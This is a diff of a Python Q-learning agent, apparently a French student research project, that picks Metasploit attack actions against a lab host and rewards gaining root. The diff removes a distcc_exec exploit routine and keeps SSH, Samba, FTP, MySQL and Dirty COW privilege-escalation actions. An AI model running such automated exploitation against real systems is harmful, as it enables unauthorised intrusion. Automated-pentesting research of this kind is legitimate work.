@@ -73,12 +73,11 @@ class QLearningTable:
     def initialise_all_actions(self):
         return {
                 str(self.ssh_login): self.ssh_login,
-                #str(self.samba): self.samba,
+                str(self.samba): self.samba,
                 str(self.ftp1): self.ftp1,
                 str(self.mysql): self.mysql,
                 str(self.dirtyCow): self.dirtyCow,
-                #str(self.ls): self.ls,
-                str(self.distcc): self.distcc
+                str(self.ls): self.ls
                 }
 
     def choose_action(self, observation):
@@ -116,6 +115,7 @@ class QLearningTable:
             )
                     
     def step(self, action, observation):
+        #s_ = 'terminal'  # next state, à modifier
         print("\nACTION: " + str(action))
         #print(type(action))
         time.sleep(5)
@@ -125,12 +125,12 @@ class QLearningTable:
         observation_dict[str(self.action_iteration)]=str(action)
         self.action_iteration +=1
         
-        #lancement de l'action et récupération des résultats
         (success2, whoami2)= action() # à vérifier
 
         #time.sleep(20) # modifier, pas bon de faire comme ça
         
         # reward function
+        #if s_ == self.canvas.coords(self.oval):
         if whoami2 == 'root':
             reward = 1 
             done = True
@@ -164,7 +164,7 @@ class QLearningTable:
     def nmap(self):
         # à modifier
         self.action_iteration= 0 # on reinitialise le nombre indiquant à quelle action on en est. Il faudra peut être mettre ça autre part que dans le nmap dans le cas où ce sera possible de réutiliser nmap au cours d'une série d'actions
-        return str({'port21':True, 'port22':True, 'port139':True, 'port3306':True, 'port3632':True}) 
+        return str({'port21':True, 'port22':True, 'port139':True, 'port3306':True}) 
     
     def background(self): # met le shell sur la machine attaquée (s'il existe) en background
         self.console.execute('background')
@@ -287,35 +287,10 @@ class QLearningTable:
             return a, b
         
         else:
-            return False, 'Not root'
-        
-        
-    def distcc(self):
-        self.console.execute('use exploit/unix/misc/distcc_exec')
-        time.sleep(10)
-        c=self.action_in_the_right_shell
-        
-        if c:
-            self.console.execute('set RHOSTS 192.168.56.101')
-            time.sleep(3)
-            self.console.execute('exploit')
-            time.sleep(15)
-            a=self.success
-            
-            if a:
-                self.console.execute('whoami')
-                time.sleep(4)
-            
-            b= self.whoami
-        
-            return a, b
-        
-        else:
-            return False, 'Not root'
-        
+            return False
     
     def dirtyCow(self):  # suite de ssh_login
-        self.console.execute('/tmp/cow')
+        self.console.execute('./cow')
         time.sleep(10) # (finalement j'en ai besoin) pas besoin finalement apparemment, car on reste sur le même thread
         c= self.action_in_the_right_shell
         
@@ -349,7 +324,4 @@ class QLearningTable:
 #        self.console.execute('y') # à modifier ?
         
         return True, 'Not root' # ls est juste une fonction de test c'est pourquoi je retourne n'importe quoi. A modifier
-    
-
-        
             
